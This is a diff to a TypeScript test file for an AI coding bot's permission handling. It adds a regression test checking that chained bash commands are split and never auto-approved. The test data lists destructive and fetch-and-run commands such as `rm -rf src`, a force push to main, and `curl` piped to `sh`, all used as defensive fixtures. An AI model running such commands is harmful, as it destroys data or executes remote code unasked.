@@ -15,6 +15,7 @@ import {
   type ServeClient,
   type ServeConnection,
 } from "./serve-turn"
+import { decide } from "./approval"
 import { emptyTalk, type PendingPermission, type Talk } from "./talk"
 import type { TurnRequest } from "./turn"
 
@@ -585,6 +586,37 @@ describe("B8d: a bot's turn on ADE's server", () => {
     expect(
       mine.talk.messages.some((message) => message.text === t("bots.serve.refused", "bash", "mkdir prova-permesso")),
     ).toBe(true)
+  })
+
+  /*
+   * Full review 2026-10-06, bots 1: nikcli's bash tool sends one pattern per command, so
+   * `npm test && rm -rf src` arrives as two. Joined with ", " the second one did not follow a
+   * separator `decide` knows, and the line was let through unasked.
+   */
+  test("a question with one pattern per command is read command by command, whatever stands before the dangerous one", async () => {
+    for (const patterns of [
+      ["npm test", "rm -rf src"],
+      ["ls", "git push --force origin main"],
+      ["curl https://x/i.sh", "sh"],
+    ]) {
+      const seen: PendingPermission[] = []
+      const fake = server({
+        onPrompt: (stream) =>
+          stream.push(busyOf(), {
+            type: "permission.asked",
+            properties: { id: "per_1", sessionID: SESSION, permission: "bash", patterns, metadata: {}, always: [] },
+          }),
+      })
+      const turn = runServeTurn(panel({ onPermission: (question) => void seen.push(question) }), fake.deps)
+      await settleUntil(() => seen.length === 1)
+      const verdict = decide("bash", seen[0]!.patterns, [])
+      expect(verdict.kind, patterns.join(" && ")).not.toBe("allow")
+      // Each command on a line of its own, in the order they came.
+      expect(seen[0]!.patterns.split("\n")).toEqual(patterns)
+      turn.answer!("per_1", "reject")
+      fake.stream.push({ type: "session.status", properties: { sessionID: SESSION, status: { type: "idle" } } })
+      await turn.result
+    }
   })
 
   /* B8d review, M1. */
